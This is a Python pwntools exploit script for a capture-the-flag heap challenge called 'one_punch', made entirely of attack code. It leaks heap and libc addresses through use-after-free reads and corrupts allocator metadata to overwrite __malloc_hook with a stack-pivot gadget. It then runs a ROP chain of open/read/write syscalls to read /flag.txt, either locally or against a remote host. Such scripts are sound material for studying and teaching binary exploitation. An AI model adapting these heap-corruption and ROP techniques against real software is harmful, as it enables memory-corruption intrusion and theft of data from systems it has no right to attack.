from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		

def cmd(c):
	p.recvuntil("> ")
	p.sendline(str(c))
	
def add(idx,name):
	cmd(1)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)
def dele(idx):
	cmd(4)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def show(idx):
	cmd(3)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def edit(idx,name):
	cmd(2)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)

def main(host,port=26976):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./one_punch")
		# debug(0x0000000000015BB)
		# gdb.attach(p)
	for i in range(2):
		add(i,"A"*0xf8)
	dele(0)
	dele(1)
	show(1)
	p.recvuntil(": ")
	heap = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x260
	for i in range(4):
		add(0,"A"*0xf8)
		dele(0)
	for i in range(7):
		add(0,"A"*0x400)
		dele(0)
	for i in range(2):
		add(i,"A"*0x400)
	dele(0)
	show(0)
	p.recvuntil(": ")
	libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x1e4ca0
	info("heap : " + hex(heap))
	info("libc : " + hex(libc.address))
	add(1,"A"*0x300)
	add(2,"A"*0x400)
	add(1,"A"*0x400)
	dele(2)
	add(1,"A"*0x300)
	add(1,"A"*0x400)
	add(0,"A"*0x217)
	payload = b"\x00"*0x108+b"/flag.txt"+b"\x00"*(0x7+0x1f0)+p64(0x101)+p64(heap+0x27d0)+p64(heap+0x30-0x10-5)
	edit(2,payload)
	dele(0)
	add(2,"A"*0xf8)
	edit(0,p64(libc.symbols["__malloc_hook"]))
	cmd(str(50056))
	p.send("C"*8)
	cmd(str(50056))
	p.send(p64(libc.address+0x000000000008cfd6))
	# pause()
	# 0x000000000008cfd6: add rsp, 0x48; ret;
	# 00000000000026542: pop rdi; ret;
	# 0x000000000012bdc9: pop rdx; pop rsi; ret;
	# 0x0000000000047cf8: pop rax; ret;
	# 0x00000000000cf6c5: syscall; ret;x
	p_rdi = 0x0000000000026542+libc.address
	p_rdx_rsi = 0x000000000012bdc9+libc.address
	p_rax = 0x0000000000047cf8+libc.address
	syscall_ret = 0x00000000000cf6c5+libc.address
	payload = p64(p_rdi)+p64(heap+0x2df8)+p64(p_rdx_rsi)+p64(0)*2+p64(p_rax)+p64(2)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x80)+p64(heap+0x2d00)+p64(p_rax)+p64(0)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(1)+p64(p_rax)+p64(1)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(0)+p64(p_rax)+p64(0)+p64(syscall_ret)
	payload = payload.ljust(0x100,b"\x00")
	gdb.attach(p)
	add(2,payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])